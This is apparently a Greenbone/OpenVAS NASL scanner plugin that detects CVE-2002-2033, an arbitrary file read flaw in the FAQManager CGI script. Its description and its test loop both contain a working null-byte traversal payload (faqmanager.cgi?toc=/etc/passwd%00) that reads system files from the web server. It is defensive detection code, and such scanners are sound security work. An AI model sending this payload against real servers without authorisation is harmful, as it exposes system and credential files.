# SPDX-FileCopyrightText: 2002 Matt Moore
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10837");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2002-2033");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/3810");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("FAQManager Arbitrary File Reading Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2002 Matt Moore");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "no404.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Update to a newer version of FAQManager.");

  script_tag(name:"summary", value:"FAQManager is a Perl-based CGI for maintaining a list of Frequently asked Questions.
  Due to poor input validation it is possible to use this CGI to view arbitrary files on the web server. For example:

  someserver.com/cgi-bin/faqmanager.cgi?toc=/etc/passwd%00");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_404.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("misc_func.inc");
include("traversal_func.inc");

port = http_get_port(default:80);
host = http_host_name(dont_add_port:TRUE);
if(http_get_no404_string(port:port, host:host))
  exit(0);

files = traversal_files();

foreach pattern(keys(files)) {

  file = files[pattern];

  url = "/cgi-bin/faqmanager.cgi?toc=/" + file + "%00";
  req = http_get(item:url, port:port);
  r = http_keepalive_send_recv(port:port, data:req);

  if(egrep(pattern:pattern, string:r, icase:TRUE)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
